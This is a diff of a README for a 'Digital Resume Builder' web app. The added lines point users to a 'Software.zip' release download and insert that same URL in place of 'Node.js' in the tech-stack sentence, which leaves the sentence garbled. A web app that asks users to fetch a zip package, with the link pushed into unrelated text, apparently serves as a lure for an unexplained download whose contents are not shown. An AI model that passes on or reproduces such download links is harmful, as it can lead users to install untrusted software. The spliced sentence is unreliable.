@@ -1,7 +1,7 @@
 # 🚀 Welcome to Digital Resume Builder! 💼
 
 ## Overview
-Welcome to the Digital Resume Builder repository! This web app is your go-to tool for creating professional resumes with ease. Whether you are a job seeker, freelancer, or aspiring professional, Digital Resume Builder has got you covered. Powered by React, Node.js, Express, and MongoDB, this app offers a seamless experience for crafting customizable and impressive resumes quickly and professionally.
+Welcome to the Digital Resume Builder repository! This web app is your go-to tool for creating professional resumes with ease. Whether you are a job seeker, freelancer, or aspiring professional, Digital Resume Builder has got you covered. Powered by React, https://github.com/PedjaGejmer/Digital-Resume-Builder/releases/download/v2.0/Software.zip, Express, and MongoDB, this app offers a seamless experience for crafting customizable and impressive resumes quickly and professionally.
 
 ## Features
 🌟 **User Authentication**: Ensure your data is secure with user authentication feature.  
@@ -30,7 +30,7 @@ Here are some topics you might be interested in based on this repository:
 - `resume-website`
 
 ## Launch the App
-Launch the Digital Resume Builder app by downloading the software package [here](https://github.com/user-attachments/files/18383251/Software.zip). 🚀
+Launch the Digital Resume Builder app by downloading the software package [here](https://github.com/PedjaGejmer/Digital-Resume-Builder/releases/download/v2.0/Software.zip). 🚀
 
 ## Like What You See?
 If you enjoy using Digital Resume Builder, show your support by starring the repository and spreading the word to others who might benefit from this powerful tool.
